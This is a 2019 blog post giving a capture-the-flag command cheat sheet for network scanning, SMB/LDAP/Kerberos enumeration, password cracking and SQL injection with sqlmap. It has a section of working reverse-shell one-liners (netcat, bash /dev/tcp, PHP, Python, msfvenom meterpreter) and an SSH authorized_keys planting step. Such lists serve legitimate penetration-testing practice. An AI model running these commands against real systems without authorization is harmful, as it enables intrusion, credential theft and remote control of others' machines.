# CTF Methods and Tool

## Helpful list of commands for CTF

[![0x7a616368](https://miro.medium.com/fit/c/96/96/0*QxVH9czKvyjvOy_3)](/@7a616368?source=post_page-----92febcac2ff4----------------------)

[0x7a616368](/@7a616368?source=post_page-----92febcac2ff4----------------------)

Follow

[Jul 15,
2019](/@7a616368/ctf-methods-and-tool-92febcac2ff4?source=post_page-----92febcac2ff4----------------------)
· 3 min read

## Setup

    Set the target IP to a variable to make it easier
    export IP=10.10.10.123
    And use it by calling $IP
    Create a working directory to store results of your scans etc
    mkdir ~/CTF/$IP
    Update Git Repos (recursive)
    find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -I {} git -C {} pull

## Nmap

    Quick Scan with Scripts Check (Default Ports - Top 1k)
    nmap -sV -sC -oA ~/CTF/$IP/std $IPRun Again with all ports
    nmap -p- -sV -sC -oA ~/CTF/$IP/std_port $IPAggressive Scan (All Enabled - if needed)
    nmap -p0- -v -A -T4 -oA ~/CTF/$IP/aggro $IP

**Useful Nmap Scripts**

    View scripts
    ls /usr/share/nmap/scripts/HTTP
    nmap --script http-enum -v $IP -p80 -oA ~/CTF/$IP/http_enum
    HTTP/DNS
    nmap --script dns-brute -v $IP -p80,443 -oA ~/CTF/$IP/dns_brute
    SMB
    nmap --script smb-enum-users.nse -p445 $IP -oA ~/CTF/$IP/smb-enum-users
    nmap --script smb-brute.nse -p445 $IP -oA ~/CTF/$IP/smb_brute
    Vulnerability (Downloads required — vulners, vulscan)
    nmap --script vulners,vulscan/vulscan.nse --script-args vulscandb=scipvuldb.csv -sV -p<Ports> $IP -oA ~/CTF/$IP/vuln

## Webservers

    Directory Brute Force
    gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -o ~/CTF/$IP/gobuster.txt -x .php,.html,.txt (-k flag for Ignore Invalid SSL)
    dirb http://$IP /usr/share/dirb/wordlists/common.txt -w -X .php,.html,.txtFuzzing
    wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 400,404,403 http://$IP/help.php?query=FUZZVulnerability
    nikto -h http://$IP -output ~/CTF/$IP/nikto.txt

## DNS

    Enum
    dnsenum <domain>
    dnsrecon -d <domain>
    Zone Transfer
    dig axfr <domain> @$IP

## Windows

*Enmeration Script:*
[*enum4linux*](https://github.com/portcullislabs/enum4linux)*  
*[http://pentestmonkey.net/tools/windows-privesc-check](http://pentestmonkey.net/windows-privesc-check)

**General**

    https://lolbas-project.github.io/Mount VHD from Remote SMB Share
    guestmount --add /mnt/backups/WindowsImageBackup/<file>.vhd --inspector --ro /mnt/vhd

**SMB**

    See what shares are on the host
    smbclient -L $IP
    smbmap -H $IP
    nmap --script smb-enum-shares -p139 $IPConnect
    smbclient //$IP/<sharename>
    smbclient //$IP/<sharename> -U <username> <password>Mount
    mount.cifs //$IP/<sharename>/  /mnt/shares/<sharename> -o username=<user>,pass=<password>Upload
    curl --upload-file <file> -u '<user>' smb://$IP/<sharename>/Brute
    hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $IP smb

**LDAP**

    nmap -p 389 --script ldap-search $IP
    ldapsearch -h $IP -p 389
    ldapsearch -LLL -x -H ldap://<FQDN> -b '' -s base '(objectclass=*)'
    ldapsearch -h $IP -p 389 -x -b "dc=example,dc=com"

**WinRM**

    evil-winrm -i $IP -u <username> -p 'password' -s '/directory/to/scripts/' -e '/directory/to/exe_files/'

**Kerberos**

    ASREPRoast (Check for no pre-auth required accounts)
    ./GetNPUsers.py -dc-ip $IP <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
    hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt

# Linux

*Enmeration Script: LinEnum.sh,*
[*linux-smart-enumeration*](https://github.com/diego-treitos/linux-smart-enumeration)*,*
[*linPE*](https://github.com/carlospolop/linPE)

    wget “https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh; chmod X+ lse.sh
    ./lse.sh -l2

**General**

    crontab -l
    aux -pshttps://gtfobins.github.io/

**SSH**

    Copy
    scp <source_file> <user>@$IP:<destination_path>Mount
    sshfs <user>@$IP:<destination_path> <source_file>Copy local SSH Key (~/.ssh/id_rsa.pub) into remote Host
    mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "ssh-rsa <INSERT KEY> root@HOSTNAME" >> ~/.ssh/authorized_keysssh -i ~/.ssh/id_rsa <user>@<IP>SSH Tunnel Dynamic Port Forwarding
    vim /etc/proxychains.conf (edit conf to set listening port)ssh -D <listening port> <host> -l <username>(leave window with above command running)
    proxychains <command> (nmap/firefox etc)

## Reverse Shells

    Listen
    nc -nlvp <port>Upgrading to full shell
    python -c 'import pty; pty.spawn("/bin/bash")'Netcat
    nc <ip> <port> -c bashBash
    /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1PHP
    <?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<ip>/<port> 0>&1’”); phpinfo(); ?>Python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'Metasploit Reverse TCP Windows
    msfvenom -p  windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o ~CTF/rs.exe

## Files

    Append to end of file
    echo "append this" >> <filename>Remove last line from file
    sed -i '$d' <filename>Print Columns 3 and 1 from foo
    awk '{ print $3, $1 }' fooRegex for Base64 encoded text
    egrep "^([A-Za-z0–9+/]{4})*([A-Za-z0–9+/]{2}==|[A-Za-z0–9+/]{3}=|[A-Za-z0–9+/]{4})$"Redirect into executable stdin
    cat $(python -c "print 'A'*76+'\x08\x87\x04\x08'") | ./pwnmeSearch for file name
    /bin/cat $(find / -name flag.txt)Search for string in file
    grep -rwl “password” /path/to/search/dirDecode Base64
    base64 -dBinwalk extract
    binwalk -e <filename>Images
    exiftool <filename>
    zsteg <filename>
    steghide <filename>
    pngcheck -v <filename>
    stegsolve (GUI)Zip
    zipdetails <filename>
    fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' <filename>
    zip2john <filename> <outfile>
    john <outfile>Image
    fls
    icat

## SQL

    sqlmap -u <url>/index.php?id=x --os-shell
    sqlmap -u <url>/index.php?id=x --dumpmysqldump -u <username> -p <password> --all-databases --skip-lock-tables

## PCAPs

    bro/zeek
    bro -Cr file.pcap
    cat dhcp.log | bro-cut client_addr host_name | sort | uniq
    cat files.log | bro-cut mime_type filename | grep “msword”
